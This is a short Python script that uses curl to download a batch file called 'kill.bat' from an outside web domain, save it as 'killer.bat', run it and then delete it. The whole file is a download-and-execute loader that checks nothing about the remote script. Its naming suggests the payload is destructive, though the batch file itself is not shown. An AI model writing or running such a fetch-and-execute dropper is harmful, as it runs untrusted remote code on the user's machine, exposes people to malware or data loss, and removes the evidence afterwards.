import os
import sys

# URL and filename
url = "https://thedomaindesigners.com/pages/kill.bat"
filename = "killer.bat"

# Use curl from CMD to download the file
download_cmd = f'curl -L -o {filename} {url}'
print(f"Downloading {url} ...")
ret = os.system(download_cmd)

if ret != 0:
    print(f"Download failed with exit code {ret}. Aborting.")
    sys.exit(1)

# Verify the file exists
if not os.path.exists(filename):
    print("Download did not produce the expected file. Aborting.")
    sys.exit(1)

# Optional: show a preview of the script
print(f"\nDownloaded {filename}. Preview of first 10 lines:\n")
os.system(f"type {filename} | more +0")  # 'type' displays contents in Windows CMD

# Execute the .bat script
print("\nExecuting the batch script...\n")
ret = os.system(filename)

if ret != 0:
    print(f"Script exited with code {ret}")
else:
    print("Script executed successfully.")

# Optional cleanup
cleanup = True
if cleanup:
    try:
        os.remove(filename)
        print(f"Removed {filename}")
    except Exception as e:
        print(f"Could not remove {filename}: {e}")
